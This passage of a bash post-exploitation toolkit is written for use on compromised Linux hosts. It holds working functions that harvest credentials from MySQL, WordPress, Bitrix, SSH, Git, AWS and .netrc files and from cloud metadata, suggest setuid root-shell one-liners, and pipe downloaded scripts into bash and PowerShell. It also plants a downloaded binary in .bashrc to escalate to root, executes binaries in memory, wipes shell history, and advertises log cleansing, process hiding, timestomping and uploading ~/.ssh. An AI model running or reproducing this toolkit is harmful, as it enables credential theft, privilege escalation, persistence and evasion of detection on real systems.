        { [ "${rv}" -eq 124 ] || [ "${rv}" -eq 7 ]; } && _HS_NO_SSRF_169=1
        unset str
    }
    [ -z "$str" ] && {
        _HS_NOT_YC=1
        return 255
    }

    _HS_GOT_SSRF_169=1
    echo -e "${CB}Yandex Cloud user-data (config)${CDY}${CF}"
    echo "$str"
    echo -en "${CN}"
    echo -e "${CW}TIP: ${CDC}curl -SsfL 'http://169.254.169.254/computeMetadata/v1/instance/?alt=text&recursive=true' -H 'Metadata-Flavor:Google'${CN}"
}

# make GS-NETCAT command available if logged in via GSNC.
gsnc() {
    [ -z "$GSNC" ] && return 255
    _GS_ALLOWNOARG=1 "$GSNC" "$@"
}
command -v gs-netcat >/dev/null || gs-netcat() { gsnc "$@"; }

lootlight() {
    local str
    ls -al /tmp/ssh-* &>/dev/null && {
        echo -e "${CB}SSH-AGENT${CDY}${CF}"
        find /tmp -name 'agent.*' -ls
        echo -e "${CN}"
    }

    [ "$UID" -ne 0 ] && {
        unset str
        str="$(find /var/tmp /tmp -maxdepth 2 -uid 0  -perm /u=s -ls 2>/dev/null)"
        [ -n "$str" ] && {
            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
            echo "${str}"
            echo -en "${CN}"
            echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec '"${HS_PY:-python}"' -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
        }

        str="$( { readlink -f /lib64/ld-*.so.* || readlink -f /lib/ld-*.so.* || readlink -f /lib/ld-linux.so.2; } 2>/dev/null )"
        [ -f "$str" ] && getcap "$str" 2>/dev/null | grep -qFm1 cap_setuid 2>/dev/null && {
            echo -e "${CB}B00M-SHELL ${CDY}${CF}"
            getcap "${str}" 2>/dev/null
            echo -en "${CN}"
            # BUG: Linux yells 'Inconsistency detected by ld.so: rtld.c: 1327: _dl_start_args_adjust: Assertion `auxv == sp + 1' failed!'
            # if TMPDIR=/dev/shm and ld.so is used to load binary.
            echo -en "${CW}TIP: ${CDC}unset TMPDIR; $str $(command -v "${HS_PY:-python}") -c"
            echo "\$'import os\ntry:\n\tos.setuid(0)\n\tos.setgid(0)\nexcept:\n\tpass\n''"'os.execl("/bin/bash", "-bash");'"'"
        }
    }

    unset str
    if command -v pgrep >/dev/null && pgrep --help 2>/dev/null | grep -qFm1 -- --list-full ; then
        if [[ "$UID" -eq 0 ]]; then
            str="$(pgrep -x 'ssh' --list-full)"
        else
            str="$(pgrep -x 'ssh' --list-full --euid "$UID")"
        fi
    elif command -v ps >/dev/null; then
        if [[ "$UID" -eq 0 ]]; then
            str="$(ps alx | grep "ssh " | grep -v grep)"
        else
            str="$(ps lx | grep "ssh " | grep -v grep)"
        fi
    fi
    [ -n "$str" ] && {
        echo -e "${CB}SSH-Hijack (reptyr)${CDY}${CF}"
        echo "${str}"
        echo -e "${CN}"
    }
}

# Someone shall implement a sub-set from TeamTNT's tricks (use
# noseyparker for cpu/time-intesive looting). TeamTNT's infos:
# https://malware.news/t/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/71346
# https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker
loot() {
    local h="${_HS_HOME_ORIG:-$HOME}"
    local str

    unset _HS_GOT_SSRF_169
    for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
        [ ! -s "$fn" ] && continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        grep -vE "^(#|\[)" <"${fn}"
        echo -en "${CN}"
        # grep -E "^(user|password)" "${h}/.my"
    done
    for fn in "${HOMEDIR:-/home}"/*/.mysql_history /root/.mysql_history; do
        [ ! -s "$fn" ] && continue
        str=$(grep -ia '^SET PASSWORD FOR' "$fn") || continue
        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
        echo "$str"
        echo -en "${CN}"
    done

    ### Bitrix
    for fn in "${HOMEDIR:-/home}"/*/*/bitrix/.settings.php; do
        loot_bitrix "$fn"
    done

    find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" 2>/dev/null | while read -r fn; do
        loot_bitrix "$fn"
    done

    find /var/www "${h}" -maxdepth 3 -type f -name wp-config.php 2>/dev/null | while read -r fn; do
        _loot_wp "$fn"
    done

    ### SSH Keys
    [ -e "/etc/ansible/ansible.cfg" ] && {
        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg")"
        s="${str##*= }"
        loot_sshkey "$s"
    }

    for fn in "${HOMEDIR:-/home}"/*/.ssh/* /root/.ssh/*; do
        loot_sshkey "$fn"
    done

    _loot_homes "SMB"    ".smbcredentials"
    _loot_homes "SMB"    ".samba_credentials"
    _loot_homes "PGSQL"  ".pgpass"
    _loot_homes "RCLONE" ".config/rclone/rclone.conf"
    _loot_homes "GIT"    ".git-credentials"
    _loot_homes "AWS S3" ".s3cfg"
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".s3backer_passwd"
    _loot_homes "AWS S3" ".passwd-s3fs"
    _loot_homes "AWS S3" ".boto"
    _loot_homes "NETRC"  ".netrc"

    # SSRF
    _loot_openstack
    _loot_aws
    _loot_yandex

    [ -z "$_HS_NO_SSRF_169" ] && {
        # Found an SSRF
        echo -e "${CW}TIP:${CN} See ${CB}${CUL}https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf${CN}"
    }

    [ "$UID" -ne 0 ] && {
        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
    }

    lootlight
}

# Try to find LPE
# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
lpe() {
    # Detect the OS
    OS="$(uname -s)"
    case "$OS" in
        Linux|Darwin)
            echo -e "${CB}Running linPEAS...${CN}"
            dl 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' | bash
            ;;
        CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
            echo -e "${CB}Running winPEAS...${CN}"
            if command -v powershell >/dev/null 2>&1; then
                echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
                powershell -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
            else
                echo -e "${CR}Error: PowerShell is not available to run winPEAS.${CN}"
                return 1
            fi
            ;;
        *)
            echo -e "${CR}Error: Unsupported operating system: $OS.${CN}"
            return 1
            ;;
    esac
}

ws() {
    # dl https://thc.org/ws | bash
    dl 'https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh' | bash
}

_hs_resize() {
    local R
    command -v reset >/dev/null && TERM=xterm reset -I
    # NOTE: On localhost, this wont always work because xterm responds to fast and
    # before 'read' gets executed.
    stty -echo;printf "\e[18t"; read -t5 -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{printf "rows "$3" cols "$2;}')
}

_hs_mk_pty() {
    local str='stty -echo;printf "\\e[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F\; '"'"'{printf "rows "$3" cols "$2;}'"'"')'
    echo -e "${CDM}Upgrading to PTY Shell${CN}"
    echo -e ">>> Press ${CDC}Ctrl-z${CN} now and cut & paste ${CDC}stty raw -echo icrnl opost; fg${CN}"
    echo -e ">>> ${CG}AFTERWARDS${CDG}, Press enter to continue"
    read -r
    echo -e ">>> Cut & paste ${CDC} source <(curl -SsfL https://thc.org/hs)${CN}${CF}
[If this is not what you want then please start again with ${CDC}${CF}export NOPTY=1${CN}${CF}]${CN}"

    if [ -n "$HS_PY" ]; then
        exec "${HS_PY:-python}" -c "import pty; pty.spawn('${SHELL:-sh}')"
    elif command -v script >/dev/null; then
        exec script -qc "${SHELL:-sh}" /dev/null
    fi

    HS_ERR "Not found: python or script"
}

_hs_destruct() {
    [ -n "$_HS_NP_D" ] && [ -d "${_HS_NP_D}" ] && {
        rm -f "${_HS_NP_D:?}"
        unset _HS_NP_D
    }
    [ -z "$XHOME" ] && return
    [ ! -d "$XHOME" ] && return
    echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
    rm -rf "${XHOME:?}"
}

xdestruct() {
    _hs_destruct
    export HOME="${_HS_HOME_ORIG}"
}

# memexec /bin/sh -c "echo hi"
# memexec -c "echo hi" </bin/sh
# GS_ARGS="-ilqD -s 5sLosWHZLpE9riqt74KvG9" memexec <(curl -SsfL https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m))
memexec() {
    local stropen strread
    local strargv0='"foo", '
    [ -t 0 ] && {
        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
        strread='$i'
        unset strargv0
    }
    perl -e '$f=syscall(319, $n="", 1);
if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
'"${stropen}"'
open($o, ">&=".$f) or die "open: $!";
while(<'"${strread:-STDIN}"'>){print $o $_;}
exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
}

ttyinject() {
    local is_mkdir
    ttyinject_clean() {
        [ -e "${_HS_HOME_ORIG}/.config/procps/reset" ] && rm -f "${_HS_HOME_ORIG}/.config/procps/reset"
        [ -n "$is_mkdir" ] && rmdir "${_HS_HOME_ORIG}/.config/procps"
    }

    [ "$UID" -eq 0 ] && { HS_ERR "You are already root"; return; }
    [ ! -d "${_HS_HOME_ORIG}/.config/procps" ] && { mkdir -p "${_HS_HOME_ORIG}/.config/procps" || return; is_mkdir=1; }

    [ ! -f "${_HS_HOME_ORIG}/.config/procps/reset" ] && {
        dl "https://github.com/hackerschoice/ttyinject/releases/download/v1.1/ttyinject-linux-$(uname -m)" >"${_HS_HOME_ORIG}/.config/procps/reset" || return
    }
    chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }

    TTY_TEST=1 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; HS_WARN "System is not vulnerable to TIOCSTI stuffing."; return; }
    if [ -f "${_HS_HOME_ORIG}/.bashrc" ]; then
        grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null || echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >"${_HS_HOME_ORIG}/.bashrc"
    else
        echo '~/.config/procps/reset 2>/dev/null' >"${_HS_HOME_ORIG}/.bashrc"
    fi
    echo -e "Wait for ${CDY}/var/tmp/.socket${CN} to appear and then do:
  ${CDC}"'/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
}

hs_exit() {
    cd /tmp || cd /dev/shm || cd /
    [ "${#_hs_bounce_src[@]}" -gt 0 ] && HS_WARN "Bounce still set in iptables. Type ${CDC}unbounce${CN} to stop the forward."
    [ -n "$XHOME" ] && [ -d "$XHOME" ] && {
        if [ -f "${XHOME}/.keep" ]; then
            HS_WARN "Keeping ${CDY}${XHOME}${CN}"
        else
            _hs_destruct
        fi
    }
    [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
    kill -9 $$
}

[ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh

### Functions (temporary)
hs_init_dl() {
    # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
    if which curl &>/dev/null; then
        _HS_SSL_ERR="certificate "
        dl() { 
            local opts=()
            [ -n "$UNSAFE" ] && opts=("-k")
            curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
        }
    elif which wget &>/dev/null; then
        _HS_SSL_ERR="is not trusted"
        dl() {
            local opts=()
            [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
            # Can not use '-q' here because that also silences SSL/Cert errors
            wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
        }
    elif [ -n "$HS_PY" ]; then
        dl() { purl "$@"; }
    elif which openssl &>/dev/null; then
        dl() { surl "$@"; }
    else
        dl() { HS_ERR "Not found: curl, wget, python or openssl"; }
    fi
}


hs_init() {
    local a
    local prg="$1"
    local str

    [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; sleep 2; }
    [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
    [ -n "$BASH" ] && {
        str="$(command -v bash)"
        [ -n "$str" ] && SHELL="${str}"
    }
    [ -z "$UID" ] && UID="$(id -u 2>/dev/null)"
    [ -z "$USER" ] && USER="$(id -un 2>/dev/null)"
    [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
    export _HS_HOME_ORIG="$HOME"

    [ -z "${HS_PY}" ] && HS_PY="$(command -v python)"
    [ -z "${HS_PY}" ] && HS_PY="$(command -v python3)"
    [ -z "${HS_PY}" ] && HS_PY="$(command -v python2)"
    HS_PY="${HS_PY##*/}"

    TERM="xterm-256color"

    [ -z "$NOPTY" ] && {
        # Upgrade to PTY shell
        [ ! -t 0 ] && _hs_mk_pty

        # Set cols/rows if not set (==0)
        [ -t 0 ] && command -v stty >/dev/null && stty -a |grep -qFm1 -- "rows 0" && _hs_resize
    }

    if [ -n "$BASH" ]; then
        trap hs_exit EXIT SIGHUP SIGTERM SIGPIPE
    else
        trap hs_exit SIGHUP SIGTERM SIGPIPE
    fi

    setsid --help 2>/dev/null | grep -Fqm1 -- --wait && _HS_SETSID_WAIT=1

    HS_SSH_OPT=()
    command -v ssh >/dev/null && {
        str="$(ssh -V 2>&1)"
        [[ "$str" == OpenSSH_[67]* ]] && a="no"
        HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
        # HS_SSH_OPT+=("-oUpdateHostKeys=no")
        HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
        HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
        HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
        HS_SSH_OPT+=("-oConnectTimeout=5")
        HS_SSH_OPT+=("-oServerAliveInterval=30")
    }
    hs_init_dl
}

# Show CN and SAN of remote server
cn() {
    local str
    local x509
    _hs_dep openssl || return
    _hs_dep sed || return

    x509="$(timeout 2 openssl s_client -showcerts -connect "${1:?}:${2:-443}" 2>/dev/null </dev/null)"
    # Extract CN
    str="$(echo "$x509" | openssl x509 -noout -subject 2>/dev/null)"
    [[ "$str" == "subject"* ]] && [[ "$str" != *"/CN"* ]] && {
        str="$(echo "$str" | sed '/^subject/s/^.*CN.*=[ ]*//g')"
        echo "$str"
    }

    # Extract SAN
    str="$(echo "$x509" | openssl x509 -noout -ext subjectAltName 2>/dev/null | grep -F DNS: | sed 's/\s*DNS://g' | sed 's/[^-a-z0-9\.\*,]//g')"
    echo "${str//,/$'\n'}"
}

_scan_single() {
    local opt=("${2}")

    [ -f "$2" ] && opt=("-iL" "$2")
    # Redirect "Unable to find nmap-services" to /dev/null
    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
}

# scan <port> <IP or file> ...
scan() {
    local port

    [ $# -lt 2 ] && { xhelp_scan; return 255; }
    _hs_dep nmap
    port="${1:?}"
    shift 1
    for ip in "$@"; do
        _scan_single "$port" "$ip"
    done
}

hs_init_alias_reinit() {
    # stop curl from creating ~/.pkt/nssdb
    which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
    alias curl &>/dev/null || alias curl='HOME=/dev/null curl'
    which wget &>/dev/null && wget --help 2>/dev/null | grep -Fqm1 -- --no-hsts && alias wget="wget --no-hsts"
}

hs_init_alias() {
    alias ssh="ssh ${HS_SSH_OPT[*]}"
    alias scp="scp ${HS_SSH_OPT[*]}"
    alias vi="vi -i NONE"
    alias vim="vim -i NONE"
    alias screen="screen -ln"

    alias l='ls -Alh'
    alias lt='ls -Alhrt'
    alias lss='ls -AlhrS'
    alias psg='ps alxwww | grep -i -E'
    alias lsg='ls -Alh --color=always | grep -i -E'
    alias cd..='cd ..'
    alias ..='cd ..'

    hs_init_alias_reinit
}

hs_init_shell() {
    unset HISTFILE LC_TERMINAL LC_TERMINAL_VERSION
    [ -n "$BASH" ] && export HISTFILE="/dev/null"
    export BASH_HISTORY="/dev/null"
    history -c 2>/dev/null
    export LANG=en_US.UTF-8
    locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
    export LESSHISTFILE=-
    export REDISCLI_HISTFILE=/dev/null
    export MYSQL_HISTFILE=/dev/null
    export T=.$'\t''~?$?'".${UID}"
    TMPDIR="/tmp"
    [ -d "/var/tmp" ] && TMPDIR="/var/tmp"
    [ -d "/dev/shm" ] && TMPDIR="/dev/shm"
    export TMPDIR
    [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"

    [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
    # Might already exist.
    [ -d "$XHOME" ] && _hs_xhome_init

    # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
    if [[ "$SHELL" == *"zsh" ]]; then
        PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
    else
        if [ "$UID" -eq 0 ]; then
            PS1='\[\033[31m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
        else
            PS1='\[\033[33m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[35m\]\w\[\033[31m\]\$\[\033[m\] '
            # PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
        fi
    fi
}

# shellcheck disable=SC2120
# Output help
xhelp() {

    [[ "$1" == "scan" ]] && { xhelp_scan; return; }
    [[ "$1" == "dbin" ]] && { xhelp_dbin; return; }
    [[ "$1" == "tit" ]] && { xhelp_tit; return; }
    [[ "$1" == "memexec" ]] && { xhelp_memexec; return; }

    echo -en "\
${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
${CDC} xsu username                          ${CDM}Switch user
${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
${CDC} ghostip                               ${CDM}Originate from a non-existing IP
${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
${CDC} shred file                            ${CDM}Securely delete a file
${CDC} notime <file> touch foo.dat           ${CDM}Execute a command at the <file>'s mtime
${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${CN}${CF}[find . -ctime -1]
${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[xhelp scan]
${CDC} hide <pid>                            ${CDM}Hide a process
${CDC} memexec <binary> [<args>]             ${CDM}Start binary in memory ${CN}${CF}[xhelp memexec]
${CDC} tit <read/write> <pid>                ${CDM}Sniff/strace the User Input [xhelp tit]
${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
${CDC} loot                                  ${CDM}Display common secrets
${CDC} lpe                                   ${CDM}Run linPEAS
${CDC} ws                                    ${CDM}WhatServer - display server's essentials
${CDC} bin [<binary>]                        ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
${CDC} dbin                                  ${CDM}Download static binary ${CN}${CF}[xhelp dbin]
${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as <name> + all child processes
${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
${CDC} xhelp                                 ${CDM}This help"
    echo -e "${CN}"
}

### Programm
hs_init "$0"
hs_init_alias
hs_init_shell

xhelp

### Finishing
echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"

### Check for obvious loots
lootlight

# unset all functions that are no longer needed.
unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
unset SSH_CONNECTION SSH_CLIENT
